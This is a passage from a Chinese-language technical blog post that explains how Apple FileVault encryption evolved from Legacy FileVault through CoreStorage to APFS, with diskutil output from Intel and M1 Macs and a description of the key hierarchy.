Leopard（花豹，10.5）做了少许改进，将虚拟磁盘改为稀疏绑定磁盘镜像（sparse bundle disk image，其特点是将文件分割为若干个 8MB 的 Band，在文件修改时无需复制全部内容，仅复制本次修改的 Band，因此备份速度更快，非常适合 Time Machine 的需求）。</p>\n<p>Apple 将上述两种版本的技术统称为 <strong>Legacy FileVault</strong> ，其存在很多严重问题，包括：</p>\n<ul>\n<li>仅加密用户目录<code>$home</code>是远远不够的，<code>/tmp</code>和<code>/var/log</code>等目录怎么办？</li>\n<li>主密钥存储在磁盘镜像文件的头部，密钥包裹算法 3DES-EDE 存在破解风险；恢复密钥的包裹算法是 1024-bit RSA，加密强度不高，也存在破解风险</li>\n<li>文件内容加密采用 AES-128 + CBC 工作模式，但初始向量 IV 没有随机性，设置算法被破解：$IV&#x3D;trunc_{128}(HMACSHA1(hmac-key||trunkno))$</li>\n<li>MacOS 置于睡眠模式时，内存数据直接写入磁盘文件<code>/var/vm/sleepimage</code>，缺乏加密保护存在密钥泄露风险</li>\n</ul>\n<p>这些问题的根源，还是由于底层文件系统 HFS+ 不支持 FDE 加密，只能基于“应用软件模拟 + 专用磁盘镜像”的替代方式实现，导致功能受限而且效率低下。</p>\n<h2 id=\"二、基于-CoreStorage-的-FileVault-2\"><a href=\"#二、基于-CoreStorage-的-FileVault-2\" class=\"headerlink\" title=\"二、基于 CoreStorage 的 FileVault 2\"></a>二、基于 CoreStorage 的 FileVault 2</h2><p>2010年，Mac OS X Lion (狮子，10.7) 发布了 FileVault 2，基于 CoreStorage 虚拟化技术推出一个重新设计的 FDE 方案，主要改造点包括：</p>\n<ul>\n<li>随着 NIST 技术标准的演进，将 AES-CBC 替换为 AES-XTS 磁盘加密模式，分组长度为128位，密钥长度为256位，并支持基于 AES 指令集的硬件解密（如Intel Broadwell 架构的CPU，加密模式只有3%的性能损耗）。</li>\n<li>在磁盘和文件系统之间增加了一个虚拟化层，也就是命名为 CoreStorage 的 LVM （Logic Volume Manager，逻辑卷管理器），类似于 Veritas Volume Manager 和 OSF LVM，但底层文件系统仍然是 HFS+。</li>\n<li>支持将<strong>User Password</strong>作为加密因子，而且支持 MacOS 的每个用户使用各自的用户密码来计算用户密钥，并解锁加密数据，非常有利于用户隐私保护！</li>\n</ul>\n<h3 id=\"1-启用方式\"><a href=\"#1-启用方式\" class=\"headerlink\" title=\"1. 启用方式\"></a>1. 启用方式</h3><p>当用户启用 FileVault 时，主要任务包括：</p>\n<ol>\n<li>系统自动生成并要求用户保存<code>Recovery password</code><br> <img src=\"/2024/01/07/Apple%20FileVault%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/recovery-key.png\" alt=\"RE\"></li>\n<li>自动将已有数据卷转换为 CoreStorage 加密卷，并将分区封装为 PV，将其导入 LVG，并设置 LVF 和 LV 以包含新的文件系统。</li>\n<li>新建一个 Recovery HD 分区卷，并将 CoreStorage 加密卷设置为启动分区。</li>\n</ol>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">Mikes-MacBook-Pro-3:~ mikej$ diskutil list</span><br><span class=\"line\">/dev/disk0 (internal, physical):</span><br><span class=\"line\"><span class=\"meta prompt_\">   #</span><span class=\"language-bash\">:                       TYPE NAME                    SIZE       IDENTIFIER</span></span><br><span class=\"line\">   0:      GUID_partition_scheme                        *251.0 GB   disk0</span><br><span class=\"line\">   1:                        EFI EFI                     209.7 MB   disk0s1</span><br><span class=\"line\">   2:          Apple_CoreStorage Mike HD                 250.1 GB   disk0s2</span><br><span class=\"line\">   3:                 Apple_Boot Recovery HD             650.1 MB   disk0s3</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-技术实现\"><a href=\"#2-技术实现\" class=\"headerlink\" title=\"2. 技术实现\"></a>2. 技术实现</h3><p>通过<code>diskutil corestorage list</code>命令，可以查看 CoreStorage 的层级结构为:<br><strong>Physical Volume -&gt; Logical Volume Group -&gt; Logical Volume Family -&gt; Logical Volume</strong></p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">CoreStorage logical volume groups (1 found)</span><br><span class=\"line\">|</span><br><span class=\"line\">+-- Logical Volume Group 5D6504C7-6C94-498E-B50C-64E3E4950AE0</span><br><span class=\"line\">|   =========================================================</span><br><span class=\"line\">|   Name:         Macintosh HD</span><br><span class=\"line\">|   Status:       Online</span><br><span class=\"line\">|   Size:         125318770688 B (125.3 GB)</span><br><span class=\"line\">|   Free Space:   0 B (0 B)</span><br><span class=\"line\">|   |</span><br><span class=\"line\">|   +-&lt; Physical Volume 499AA4FC-31C1-47A3-8364-89A0C836125C        # 上层PV</span><br><span class=\"line\">|   |   ----------------------------------------------------</span><br><span class=\"line\">|   |   Index:    0</span><br><span class=\"line\">|   |   Disk:     disk0s2</span><br><span class=\"line\">|   |   Status:   Online</span><br><span class=\"line\">|   |   Size:     125318770688 B (125.3 GB)</span><br><span class=\"line\">|   |</span><br><span class=\"line\">|   +-&gt; Logical Volume Family 163A0B82-4315-4C68-8403-52B5A918C57C  # 下层LVF</span><br><span class=\"line\">|       ----------------------------------------------------------</span><br><span class=\"line\">|       Encryption Status:       Unlocked</span><br><span class=\"line\">|       Encryption Type:         AES-XTS</span><br><span class=\"line\">|       Conversion Status:       Complete</span><br><span class=\"line\">|       Conversion Direction:    -none-</span><br><span class=\"line\">|       Has Encrypted Extents:   Yes</span><br><span class=\"line\">|       Fully Secure:            Yes</span><br><span class=\"line\">|       Passphrase Required:     Yes</span><br><span class=\"line\">|       |</span><br><span class=\"line\">|       +-&gt; Logical Volume 264CFBDC-8103-47E0-978E-738789320980     # 再下层LV</span><br><span class=\"line\">|           ---------------------------------------------------</span><br><span class=\"line\">|           Disk:                  disk1</span><br><span class=\"line\">|           Status:                Online</span><br><span class=\"line\">|           Size (Total):          124999999488 B (125.0 GB)</span><br><span class=\"line\">|           Conversion Progress:   -none-</span><br><span class=\"line\">|           Revertible:            Yes (unlock and decryption required)</span><br><span class=\"line\">|           LV Name:               Macintosh HD</span><br><span class=\"line\">|           Volume Name:           Macintosh HD</span><br><span class=\"line\">|           Content Hint:          Apple_HFS</span><br></pre></td></tr></table></figure>\n\n<p>LVF- logical volume family 是 Apple 自定义的层级，用于 LV 逻辑卷特定属性的继承。<br>系统变量<code>com.apple.corestorage.lv.familyUUID</code>用于构造 AES-XTS 的 Tweak key 的加密因子。</p>\n<h2 id=\"三、基于-APFS-的-FileVault\"><a href=\"#三、基于-APFS-的-FileVault\" class=\"headerlink\" title=\"三、基于 APFS 的 FileVault\"></a>三、基于 APFS 的 FileVault</h2><p>2017年，MacOS High Sierra（内华达脊岭，10.13） 正式启用了 APFS（Apple FileSystem），用于替代古老的 HFS+。<br>作为新一代的文件系统，APFS 专门针对闪存&#x2F;SSD进行优化（但依然可用于传统机械硬盘），提供了更强大的加密、写入时复制元数据、空间分享、文件和目录克隆、快照、目录大小快速调整、原子级安全存储基元，以及改进的文件系统底层技术，将全面应用于该公司旗下 MacOS、iOS、iPadOS、tvOS、watchOS等所有设备中。其突出特点包括：</p>\n<ul>\n<li>inode编码长度提高到64位，单一Volume的文件数量大大增加；时间戳精度提高到纳秒，有助于实现原子性和原子事务；目录大小是单独存储的，无需每次实时计算目录容量；文件和文件夹名称被规范化，完全支持Unicode</li>\n<li>支持COW（Copy On Write，写入时复制）：几乎立即复制文件或目录，元数据多次存在于文件结构中，但共享相同的数据存储空间；修改克隆时，文件系统仅记录数据更改</li>\n<li>支持快照（Snapshot）：支持创建特点时间点、文件系统只读实例的快照</li>\n<li>支持空间共享：使用 GPT 分区方案，单一容器内部包含多个 Volume 共享物理存储容量，并可以相互访问，但不与其他容器共享数据</li>\n</ul>\n<p><img src=\"/2024/01/07/Apple%20FileVault%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/apfs.png\" alt=\"a\"></p>\n<p>关于加密功能，APFS 引入 container（容器）并整合了 CoreStorage 技术，完全实现了文件系统层级的原生实现，包括：</p>\n<ol>\n<li>支持对容器、卷和文件使用的数据结构进行加密。当一个volume是加密的，它的文件系统树和该卷中的文件内容都是加密的</li>\n<li>统一实现了 FDE 和 FBE，支持三种加密模型：不加密、单密钥加密、多密钥加密，但<strong>MacOS 目前似乎仅支持 FDE 模式</strong></li>\n<li>支持硬件加密和软件加密。<br> 硬件加密适用于Apple提供的内置存储（例如带有T2安全芯片的 MacOS 和 iOS 设备）；<br> 软件加密适用于用于外部存储，以及不支持硬件加密的设备上的内部存储；<br> 使用硬件加密时，只有操作系统内核可以与内部存储交互；<br> 根据硬件的不同，可以使用 AES-XTS 或 AES-CBC 加密模式。</li>\n</ol>\n<p>层级结构也调整为：<strong>Physical Store -&gt; Contianer -&gt; （Volume Group） -&gt; Volume</strong></p>\n<h3 id=\"1-技术分析（Intel-CPU）\"><a href=\"#1-技术分析（Intel-CPU）\" class=\"headerlink\" title=\"1. 技术分析（Intel CPU）\"></a>1. 技术分析（Intel CPU）</h3><p>示例是一台 Intel CPU 的 iMac 设备，因此并没有安全隔区等 Apple 专用 Soc 设备。<br>命令行<code>df -h</code>查看文件系统</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">sj@JiandeiMac ~ % df -h</span><br><span class=\"line\">Filesystem      Size   Used  Avail Capacity iused      ifree %iused  Mounted on</span><br><span class=\"line\">/dev/disk1s5   234Gi   10Gi   29Gi    27%  488433 2448636927    0%   /</span><br><span class=\"line\">devfs          190Ki  190Ki    0Bi   100%     659          0  100%   /dev</span><br><span class=\"line\">/dev/disk1s1   234Gi  191Gi   29Gi    87% 3218923 2445906437    0%   /System/Volumes/Data</span><br><span class=\"line\">/dev/disk1s4   234Gi  2.0Gi   29Gi     7%       2 2449125358    0%   /private/var/vm</span><br><span class=\"line\">map auto_home    0Bi    0Bi    0Bi   100%       0          0  100%   /System/Volumes/Data/home</span><br><span class=\"line\">/dev/disk1s3   234Gi  505Mi   29Gi     2%      50 2449125310    0%   /Volumes/Recovery</span><br></pre></td></tr></table></figure>\n\n<p>通过<code>diskutil list</code>，可以看到物理硬盘<code>disk0</code>包含了2个分区，分别是EFI启动分区<code>disk0-s1</code>和APFS分区<code>disk0-s2</code>，并将后者同步映射到<code>disk1</code>。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">j@JiandeiMac ~ % diskutil list</span><br><span class=\"line\">/dev/disk0 (internal, physical):</span><br><span class=\"line\"><span class=\"meta prompt_\">   #</span><span class=\"language-bash\">:                       TYPE NAME                    SIZE       IDENTIFIER</span></span><br><span class=\"line\">   0:      GUID_partition_scheme                        *251.0 GB   disk0</span><br><span class=\"line\">   1:                        EFI EFI                     209.7 MB   disk0s1</span><br><span class=\"line\">   2:                 Apple_APFS Container disk1         250.8 GB   disk0s2</span><br><span class=\"line\"></span><br><span class=\"line\">/dev/disk1 (synthesized):</span><br><span class=\"line\"><span class=\"meta prompt_\">   #</span><span class=\"language-bash\">:                       TYPE NAME                    SIZE       IDENTIFIER</span></span><br><span class=\"line\">   0:      APFS Container Scheme -                      +250.8 GB   disk1</span><br><span class=\"line\">                                 Physical Store disk0s2</span><br><span class=\"line\">   1:                APFS Volume 未命名 - 数据           205.4 GB   disk1s1</span><br><span class=\"line\">   2:                APFS Volume Preboot                 81.4 MB    disk1s2</span><br><span class=\"line\">   3:                APFS Volume Recovery                530.0 MB   disk1s3</span><br><span class=\"line\">   4:                APFS Volume VM                      5.4 GB     disk1s4</span><br><span class=\"line\">   5:                APFS Volume 未命名                  11.2 GB    disk1s5</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/01/07/Apple%20FileVault%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/apfs_concepts.png\" alt=\"AFPS\"><br>用于启动 Mac 的 APFS 容器必须包含至少五个宗卷，其中前三个宗卷对用户隐藏 ：</p>\n<ul>\n<li>Preboot Volume：包含启动容器中每个系统宗卷所需的数据</li>\n<li>VM Volume：MacOS 用于交换文件储存</li>\n<li>Recovery Volume：包含 recoveryOS，进入Recovery模式可以清除用户密码</li>\n<li>System Volume：包含用于启动 Mac 的所有必要文件、macOS 原生安装的所有 App</li>\n<li>Data Volume：包含用户文件夹中的任何数据、用户安装的 App、第三方 App、用户拥有且能够写入的其他位置</li>\n</ul>\n<p>每增加一个系统宗卷， 便会创建一个数据宗卷。3个隐藏宗卷全为共享宗卷且无法复制。<br>通过<code>diskutil apfs list</code>，可以查看容器 disk1 的详细信息。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">sj@JiandeiMac ~ % diskutil apfs list</span><br><span class=\"line\">APFS Container (1 found)</span><br><span class=\"line\">|</span><br><span class=\"line\">+-- Container disk1 0B311DB5-B224-4F51-AA7C-1211E5A2A994</span><br><span class=\"line\">    ====================================================</span><br><span class=\"line\">    APFS Container Reference:     disk1</span><br><span class=\"line\">    Size (Capacity Ceiling):      250790436864 B (250.8 GB)</span><br><span class=\"line\">    Capacity In Use By Volumes:   219201548288 B (219.2 GB) (87.4% used)</span><br><span class=\"line\">    Capacity Not Allocated:       31588888576 B (31.6 GB) (12.6% free)</span><br><span class=\"line\">    |</span><br><span class=\"line\">    +-&lt; Physical Store disk0s2 4024090C-7938-4238-9772-192071FEDE07     # 上层物理设备</span><br><span class=\"line\">    |   -----------------------------------------------------------</span><br><span class=\"line\">    |   APFS Physical Store Disk:   disk0s2</span><br><span class=\"line\">    |   Size:                       250790436864 B (250.8 GB)</span><br><span class=\"line\">    |</span><br><span class=\"line\">    +-&gt; Volume disk1s1 925F8706-12D2-305B-B8E0-14201AF1D027             # 数据Volume</span><br><span class=\"line\">    |   ---------------------------------------------------</span><br><span class=\"line\">    |   APFS Volume Disk (Role):   disk1s1 (Data)</span><br><span class=\"line\">    |   Name:                      未命名 - 数据 (Case-insensitive)</span><br><span class=\"line\">    |   Mount Point:               /System/Volumes/Data                 # 加载用户数据目录</span><br><span class=\"line\">    |   Capacity Consumed:         205089447936 B (205.1 GB)</span><br><span class=\"line\">    |   FileVault:                 Yes (Unlocked)                       # 加密状态：已解锁</span><br><span class=\"line\">    |</span><br><span class=\"line\">    +-&gt; Volume disk1s2 35818BF3-204E-4024-A049-FE5D61D96B74             # 预启动Volume</span><br><span class=\"line\">    |   ---------------------------------------------------</span><br><span class=\"line\">    |   APFS Volume Disk (Role):   disk1s2 (Preboot)</span><br><span class=\"line\">    |   Name:                      Preboot (Case-insensitive)</span><br><span class=\"line\">    |   Mount Point:               Not Mounted</span><br><span class=\"line\">    |   Capacity Consumed:         81448960 B (81.4 MB)</span><br><span class=\"line\">    |   FileVault:                 No</span><br><span class=\"line\">    |</span><br><span class=\"line\">    +-&gt; Volume disk1s3 3873B186-B246-4F1D-8E7B-4E2515E4B838</span><br><span class=\"line\">    |   ---------------------------------------------------</span><br><span class=\"line\">    |   APFS Volume Disk (Role):   disk1s3 (Recovery)                   # 恢复Volume</span><br><span class=\"line\">    |   Name:                      Recovery (Case-insensitive)</span><br><span class=\"line\">    |   Mount Point:               /Volumes/Recovery</span><br><span class=\"line\">    |   Capacity Consumed:         529969152 B (530.0 MB)</span><br><span class=\"line\">    |   FileVault:                 No</span><br><span class=\"line\">    |</span><br><span class=\"line\">    +-&gt; Volume disk1s4 F1A4B4C8-0360-4F92-8687-9BCE3F2F9134             # 虚拟内存Volume</span><br><span class=\"line\">    |   ---------------------------------------------------</span><br><span class=\"line\">    |   APFS Volume Disk (Role):   disk1s4 (VM)</span><br><span class=\"line\">    |   Name:                      VM (Case-insensitive)</span><br><span class=\"line\">    |   Mount Point:               /private/var/vm</span><br><span class=\"line\">    |   Capacity Consumed:         2148556800 B (2.1 GB)</span><br><span class=\"line\">    |   FileVault:                 No</span><br><span class=\"line\">    |</span><br><span class=\"line\">    +-&gt; Volume disk1s5 7B89960E-7BBB-4012-BD70-27E4DE0A5ADC             # 系统Volume</span><br><span class=\"line\">        ---------------------------------------------------</span><br><span class=\"line\">        APFS Volume Disk (Role):   disk1s5 (System)</span><br><span class=\"line\">        Name:                      未命名 (Case-insensitive)</span><br><span class=\"line\">        Mount Point:               /                                    # 加载系统根目录</span><br><span class=\"line\">        Capacity Consumed:         11213705216 B (11.2 GB)</span><br><span class=\"line\">        FileVault:                 Yes (Unlocked)                       #加密状态：已解锁</span><br></pre></td></tr></table></figure>\n\n<p>通过<code>diskutil apfs listusers $Volume_ID</code>，查看当前有效的用户密钥信息，即有几个 KEK 副本。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">sj@JiandeiMac /Volumes % diskutil apfs listusers 925F8706-12D2-305B-B8E0-14201AF1D027</span><br><span class=\"line\">Cryptographic users for disk1s1 (3 found)</span><br><span class=\"line\">|</span><br><span class=\"line\">+-- FBD4D606-E5F2-4FC5-B6C0-70E11D1A3FB1</span><br><span class=\"line\">|   Type: Local Open Directory User</span><br><span class=\"line\">|</span><br><span class=\"line\">+-- EC1C2AD9-B618-4ED6-BD8D-50F361C27507</span><br><span class=\"line\">|   Type: iCloud Recovery User</span><br><span class=\"line\">|</span><br><span class=\"line\">+-- 64C0C6EB-0000-11AA-AA11-00306543ECAC</span><br><span class=\"line\">    Type: iCloud Recovery External Key</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-签名系统卷（M1-CPU）\"><a href=\"#2-签名系统卷（M1-CPU）\" class=\"headerlink\" title=\"2. 签名系统卷（M1 CPU）\"></a>2. 签名系统卷（M1 CPU）</h3><p>MacOS 10.15 Catalina 引入了 APFS Volume Group，系统卷和数据卷属于同一卷组，并且在 Finder 中被视为一个卷；引入了只读系统宗卷，这是一个专用于系统内容（通常名为“Macintosh HD”）的独立宗卷，默认不能写入数据，甚至 Apple 系统进程也不能。<br>MacOS 11 Big Sur 将只读系统宗卷升级为签名系统卷 (SSV，Sealed &amp; Signed System Volume)，进一步增加了操作系统的签名保护，甚至现在启动系统的都不是真实的 System 卷宗，而是启动时创建的一个快照。<br>SSV 具有的内核机制会在运行时验证系统内容的完整性，并拒绝不含来自 Apple 的有效加密签名的任何代码和非代码数据。此外，还有一个附带的优势，在进行操作系统更新时如果发生意外无法执行， 无需重新安装即可恢复到旧系统版本。</p>\n<blockquote>\n<p>SSV 签名系统卷依赖于 SKP 密钥（Sealed Key Prtection，密封密钥保护，也称为操作系统绑定密钥），也就是依赖于 Apple 安全隔区硬件，因此 Intel CPU 不适用。</p>\n</blockquote>\n<p>通过 <code>diskutil list</code>，可以看到物理硬盘<code>disk0</code>包含了3个容器：</p>\n<ul>\n<li>Apple_APFS_ISC 容器：ISC（iBoot System Container）容器负责在早期引导过程中支持 iBoot 固件，并为 M1 SoC 中的 Secure Enclave 提供可信存储。<br>  iSCPreboot 卷是指定的引导程序，空的 Recovery 卷用于恢复。xART 卷提供可信存储，Hardware 卷包含与硬件相关的文件。</li>\n<li>Apple_APFS_Recovery 容器：专用于提供 1TR，存储在其 Recovery 卷上。包括 iBoot 的第二部分以及 M1 的完整恢复模式所需的所有内容。<br>  该 Recovery 卷被指定用于恢复，但此该容器没有单独的引导程序卷。</li>\n<li>Apple_APFS 容器：M1 的引导容器 Apple_APFS 也与 Intel Mac 上的引导容器不太一样：一个细微但显著的区别是数据卷不是命名为“Macintosh HD - Data”，而是简单的“Data”。如果使用依赖于按名称查找数据卷的代码，则要重新检查它代码是否仍然有效。<br>  尽管此容器仍有一个 Recovery 卷，但该 Recovery 卷已经受到了一些限制，比如无法访问安全策略等，在引导到恢复模式时也没有使用该 Recovery 卷。</li>\n</ul>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">sj@SunJiandeMacBook-Air ~ % diskutil list     </span><br><span class=\"line\">/dev/disk0 (internal, physical):</span><br><span class=\"line\"><span class=\"meta prompt_\">   #</span><span class=\"language-bash\">:                       TYPE NAME                    SIZE       IDENTIFIER</span></span><br><span class=\"line\">   0:      GUID_partition_scheme                        *1.0 TB     disk0</span><br><span class=\"line\">   1:             Apple_APFS_ISC Container disk1         524.3 MB   disk0s1</span><br><span class=\"line\">   2:                 Apple_APFS Container disk3         994.7 GB   disk0s2</span><br><span class=\"line\">   3:        Apple_APFS_Recovery Container disk2         5.4 GB     disk0s3</span><br><span class=\"line\"></span><br><span class=\"line\">/dev/disk3 (synthesized):</span><br><span class=\"line\"><span class=\"meta prompt_\">   #</span><span class=\"language-bash\">:                       TYPE NAME                    SIZE       IDENTIFIER</span></span><br><span class=\"line\">   0:      APFS Container Scheme -                      +994.7 GB   disk3</span><br><span class=\"line\">                                 Physical Store disk0s2</span><br><span class=\"line\">   1:                APFS Volume Untitled - Data         397.7 GB   disk3s1</span><br><span class=\"line\">   2:                APFS Volume Untitled                12.0 GB    disk3s3</span><br><span class=\"line\">   3:              APFS Snapshot com.apple.os.update-... 12.0 GB    disk3s3s1</span><br><span class=\"line\">   4:                APFS Volume Preboot                 10.0 GB    disk3s4</span><br><span class=\"line\">   5:                APFS Volume Recovery                1.7 GB     disk3s5</span><br><span class=\"line\">   6:                APFS Volume VM                      20.5 KB    disk3s6</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/01/07/Apple%20FileVault%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/m1.jpg\" alt=\"M1\"></p>\n<p>通过<code>diskutil apfs list</code>，可以发现增加了一个签名系统卷<code>disk3-s3</code>，隐藏了一个系统卷<code>disks3-s2</code>，实际指向了 SSV 的快照<code>disks3-s3-s1</code>。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">sj@SunJiandeMacBook-Air ~ % diskutil apfs list</span><br><span class=\"line\">APFS Containers (3 found)</span><br><span class=\"line\">|</span><br><span class=\"line\">+-- Container disk3 F2E4F923-BAEF-4844-8720-A1E3C4A91D68</span><br><span class=\"line\">    ====================================================</span><br><span class=\"line\">    APFS Container Reference:     disk3</span><br><span class=\"line\">    Size (Capacity Ceiling):      994662584320 B (994.7 GB)</span><br><span class=\"line\">    Capacity In Use By Volumes:   422349295616 B (422.3 GB) (42.5% used)</span><br><span class=\"line\">    Capacity Not Allocated:       572313288704 B (572.3 GB) (57.5% free)</span><br><span class=\"line\">    |</span><br><span class=\"line\">    +-&lt; Physical Store disk0s2 03B7C267-30AE-414D-93B3-82B5E6A7D794</span><br><span class=\"line\">    |   -----------------------------------------------------------</span><br><span class=\"line\">    |   APFS Physical Store Disk:   disk0s2</span><br><span class=\"line\">    |   Size:                       994662584320 B (994.7 GB)</span><br><span class=\"line\">    |</span><br><span class=\"line\">    +-&gt; Volume disk3s1 4C4F95CE-27C8-4CC8-9287-0746D8B6F445</span><br><span class=\"line\">    |   ---------------------------------------------------</span><br><span class=\"line\">    |   APFS Volume Disk (Role):   disk3s1 (Data)</span><br><span class=\"line\">    |   Name:                      Untitled - Data (Case-insensitive)</span><br><span class=\"line\">    |   Mount Point:               /System/Volumes/Data</span><br><span class=\"line\">    |   Capacity Consumed:         397743120384 B (397.7 GB)</span><br><span class=\"line\">    |   Sealed:                    No</span><br><span class=\"line\">    |   FileVault:                 Yes (Unlocked)</span><br><span class=\"line\">    |</span><br><span class=\"line\">    +-&gt; Volume disk3s3 2F5B627D-273D-43E1-B33D-11A51F2DD616</span><br><span class=\"line\">    |   ---------------------------------------------------</span><br><span class=\"line\">    |   APFS Volume Disk (Role):   disk3s3 (System)                         # SSV卷宗</span><br><span class=\"line\">    |   Name:                      Untitled (Case-insensitive)</span><br><span class=\"line\">    |   Mount Point:               /System/Volumes/Update/mnt1</span><br><span class=\"line\">    |   Capacity Consumed:         12000673792 B (12.0 GB)</span><br><span class=\"line\">    |   Sealed:                    Broken</span><br><span class=\"line\">    |   FileVault:                 Yes (Unlocked)</span><br><span class=\"line\">    |   Encrypted:                 No</span><br><span class=\"line\">    |   |</span><br><span class=\"line\">    |   Snapshot:                  888DEA8C-D791-4F5B-BC62-26E2D6A436E4     # 快照卷宗</span><br><span class=\"line\">    |   Snapshot Disk:             disk3s3s1</span><br><span class=\"line\">    |   Snapshot Mount Point:      /</span><br><span class=\"line\">    |   Snapshot Sealed:           Yes                                      # 认证通过</span><br><span class=\"line\">    |</span><br><span class=\"line\">    +-&gt; Volume disk3s4 C828BF80-F6B2-4370-8C12-5DC67A144D2A</span><br><span class=\"line\">    |   ---------------------------------------------------</span><br><span class=\"line\">    |   APFS Volume Disk (Role):   disk3s4 (Preboot)</span><br><span class=\"line\">    |   Name:                      Preboot (Case-insensitive)</span><br><span class=\"line\">    |   Mount Point:               /System/Volumes/Preboot</span><br><span class=\"line\">    |   Capacity Consumed:         10008113152 B (10.0 GB)</span><br><span class=\"line\">    |   Sealed:                    No</span><br><span class=\"line\">    |   FileVault:                 No</span><br><span class=\"line\">    |</span><br><span class=\"line\">    +-&gt; Volume disk3s5 48782923-A22F-45A8-A688-E4F72065E32B</span><br><span class=\"line\">    |   ---------------------------------------------------</span><br><span class=\"line\">    |   APFS Volume Disk (Role):   disk3s5 (Recovery)</span><br><span class=\"line\">    |   Name:                      Recovery (Case-insensitive)</span><br><span class=\"line\">    |   Mount Point:               Not Mounted</span><br><span class=\"line\">    |   Capacity Consumed:         1675984896 B (1.7 GB)</span><br><span class=\"line\">    |   Sealed:                    No</span><br><span class=\"line\">    |   FileVault:                 No</span><br><span class=\"line\">    |</span><br><span class=\"line\">    +-&gt; Volume disk3s6 1793DE3F-A7B8-4103-A03A-91113BF324E7</span><br><span class=\"line\">        ---------------------------------------------------</span><br><span class=\"line\">        APFS Volume Disk (Role):   disk3s6 (VM)</span><br><span class=\"line\">        Name:                      VM (Case-insensitive)</span><br><span class=\"line\">        Mount Point:               /System/Volumes/VM</span><br><span class=\"line\">        Capacity Consumed:         20480 B (20.5 KB)</span><br><span class=\"line\">        Sealed:                    No</span><br><span class=\"line\">        FileVault:                 No</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、FileVault的密钥层级\"><a href=\"#四、FileVault的密钥层级\" class=\"headerlink\" title=\"四、FileVault的密钥层级\"></a>四、FileVault的密钥层级</h2><p>对比 Data Protection 数据保护技术，FileVault 等价于 C 类，使用基于 AES-XTS 的 FDE 全盘加密模式保护卷宗数据。经过多年的技术演进，最新、最复杂的 Apple FileVault 密钥层级如下图。</p>\n<p><img src=\"/2024/01/07/Apple%20FileVault%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/filevault-on.png\" alt=\"SKP\"></p>\n<ul>\n<li>SKP（Sealed Key Prtection，密封密钥保护，也称为操作系统绑定密钥）：Apple 为其设计的 SoC 设备开发的，旨在确保其专用设备被拆解、或使用未认证的操作系统版本等场景下，无法获取加密材料，目的是为系统密钥提供独立于安全隔区的额外保护。<br>  注意！SKP 功能<strong>不是由安全隔区提供的</strong>，而是由位于更底层的硬件寄存器支持，实际上是基于安全隔区操作系统 sepOS 加载时的测量值。这也意味着，其仅在搭载 Apple 设计的 SoC 的设备上提供。</li>\n<li>xART（eXtended Anti-Replay Technology，扩展反重放技术）：一组为具有反重放功能 (基于物理储存架构) 的安全隔区提供加密且经认证的永久储存区的服务。<br>  xART 是 Apple 设计的第二代安全存储组件，增加了一个计数器加密箱，包括：1个128位盐，1个128位密码验证器，1个8位计数器，1个8位最大尝试值。</li>\n<li>KEK（Key Encryption Key，密钥保护密钥）：派生密钥，基于用户口令、SKP密钥和硬件密钥（基于UID派生）进行密钥扩展生成</li>\n<li>VEK（Volume Encryption key，卷宗保护密钥）：随机生成密钥，基于 KEK 和 硬件密钥进行包裹，并被 xART 保护，就是用于卷宗数据加密的 AES-XTS 的分组密钥 key1。</li>\n</ul>\n<p>如上所述，搭载 Apple 芯片的 Mac 以及搭载 T2 芯片的 Mac 通过构建和管理密钥层级实施内部宗卷加密，基于芯片内建的硬件加密技术而构建。<br>在搭载 Apple 芯片的 Mac 以及搭载 T2 芯片的 Mac 上，所有文件保险箱密钥的处理都发生在安全隔区中；加密密钥绝不会直接透露给 Intel CPU。<br>所有 APFS 宗卷默认使用宗卷加密密钥创建。宗卷和元数据内容使用此宗卷加密密钥加密，此宗卷加密密钥使用类密钥封装。 文件保险箱启用时，类密钥受用户密码和硬件 UID 共同保护。<br>如果没有有效的登录凭证（User passcode）或加密恢复密钥（Recovery key），即使物理储存设备被移除并连接到其他电脑，内置 APFS 宗卷仍无法解密，以防止未经授权的访问。</p>\n<p>删除宗卷时，其宗卷加密密钥由安全隔区安全删除，这有助于防止以后使用此密钥进行访问 (即使是通过安全隔区)。另外，所有宗卷加密密钥都使用媒介密钥封装。媒介密钥不提供额外的数据机密性，而是旨在启用快速安全的数据删除，如果缺少了它，则不可能进行解密。<br>在搭载 Apple 芯片的 Mac 和搭载 T2 芯片的 Mac 上，媒介密钥一定是由受安全隔区支持的技术来抹掉，例如远程 MDM（Mobile Device Management，远程-移动设备管理） 命令。以这种方式抹掉媒介密钥将导致宗卷因存在加密而不可访问。</p>\n<p>可移除储存设备的加密不使用安全隔区的安全性功能，而是采用与基于 Intel 的 Mac (不搭载 T2 芯片) 相同的方式执行加密。</p>\n<h3 id=\"1-版本演进\"><a href=\"#1-版本演进\" class=\"headerlink\" title=\"1. 版本演进\"></a>1. 版本演进</h3><ul>\n<li>在 macOS 10.7 Lion 中，引入了 CoreStorage 管理卷，并规定 VEK 密钥的创建点是用户在 Mac 上<strong>启用FileVault</strong>的过程中。</li>\n<li>在 macOS 10.13 High Sierra 中，引入了 AFPS 文件系统，VEK 密钥的创建点调整为：<strong>用户创建过程中</strong>、 设定首位用户的密码或 Mac 用户首次登录过程中。换句话说，无论用户是否启用 FileVault，卷宗数据都会被加密，其区别仅在于：<ul>\n<li>如果没有启用 FileVault 